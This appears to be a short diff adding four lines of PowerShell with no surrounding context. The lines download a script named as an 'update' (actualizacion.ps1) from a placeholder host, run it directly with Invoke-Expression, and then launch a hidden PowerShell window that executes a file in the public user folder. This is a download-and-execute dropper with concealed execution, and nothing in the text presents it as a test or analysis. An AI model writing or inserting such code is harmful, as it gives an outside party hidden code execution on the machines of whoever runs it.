@@ -1,0 +1,4 @@
+$u = 'https://servidor.invalid/actualizacion.ps1'
+$c = (New-Object Net.WebClient).DownloadString($u)
+Invoke-Expression $c
+Start-Process powershell -WindowStyle Hidden -ArgumentList '-NoProfile -File C:\Users\Public\a.ps1'
